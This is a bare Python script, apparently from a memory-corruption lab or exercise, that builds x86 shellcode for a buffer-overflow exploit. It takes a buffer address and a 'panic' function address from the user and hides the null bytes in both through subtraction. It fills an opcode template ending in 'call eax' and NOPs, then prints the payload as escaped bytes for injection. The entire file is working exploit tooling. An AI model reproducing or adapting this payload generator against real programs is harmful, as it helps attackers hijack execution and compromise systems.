shellcode = 'B8{}B9{}29C883C03250B8{}B9{}29C8FFD090909090'

#00041f44
#00006096

def get_shellcode(buf_addr, panic_addr):
    buf_base = int.from_bytes(bytes.fromhex(buf_addr), "big") + 0x01010101
    buf_low = 0x01010101
    tmp = buf_base.to_bytes(4, 'little').hex()
    while('00' in buf_base.to_bytes(4, 'little').hex() or
          '00' in buf_low.to_bytes(4, 'little').hex()):
        buf_base += 1
        buf_low += 1

    panic_base = int.from_bytes(bytes.fromhex(panic_addr), "big") + 0x01010101
    panic_low = 0x01010101
    while('00' in panic_base.to_bytes(4, 'little').hex() or
          '00' in panic_low.to_bytes(4, 'little').hex()):
        panic_base += 1
        panic_low += 1

    return shellcode.format(buf_base.to_bytes(4, 'little').hex(), buf_low.to_bytes(4, 'little').hex(),
                            panic_base.to_bytes(4, 'little').hex(), panic_low.to_bytes(4, 'little').hex())

def main():
    buf_addr = input('Enter the address of the buffer: ')
    panic_addr = input('Enter the address of the panic function: ')

    byte_code = bytes.fromhex(get_shellcode(buf_addr, panic_addr))
    for i in byte_code:
        print(f'\\x{ hex(i)[2:].upper() }', end='')
    print('\n')

if __name__ == '__main__':
    main()
